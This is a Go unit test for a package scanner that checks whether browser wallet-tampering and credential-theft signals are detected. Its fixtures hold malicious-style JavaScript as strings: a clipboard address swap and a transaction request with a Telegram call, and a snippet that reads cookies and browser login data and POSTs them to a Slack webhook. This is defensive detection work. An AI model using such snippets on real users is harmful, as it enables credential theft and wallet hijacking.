package browser

import (
	"testing"

	"github.com/kurokuma/pkg9/internal/model"
)

func TestScannerReportsBrowserSignals(t *testing.T) {
	target := model.ScanTarget{
		Files: []model.ScanFile{
			{
				RelativePath:   "wallet.js",
				IsText:         true,
				Classification: "source",
				NormalizedText: `window.ethereum.request({method:"eth_sendTransaction"}); navigator.clipboard.writeText("0xabc"); fetch("https://api.telegram.org/bot123/sendMessage")`,
			},
			{
				RelativePath:   "cookie.js",
				IsText:         true,
				Classification: "source",
				NormalizedText: `const path = "Login Data"; const cookie = document.cookie; fetch("https://hooks.slack.com/services/T/B/X", {method:"POST", body:path + cookie});`,
			},
			{
				RelativePath:   "benign.js",
				IsText:         true,
				Classification: "source",
				NormalizedText: `window.ethereum.request({method:"eth_chainId"}); console.log("wallet connected");`,
			},
		},
	}
	out := (Scanner{}).Run(target)
	if len(out.Signals["browser_wallet_tampering"]) != 1 {
		t.Fatalf("expected wallet tampering signal, got %+v", out.Signals["browser_wallet_tampering"])
	}
	if len(out.Signals["browser_credential_theft"]) != 1 {
		t.Fatalf("expected credential theft signal, got %+v", out.Signals["browser_credential_theft"])
	}
}
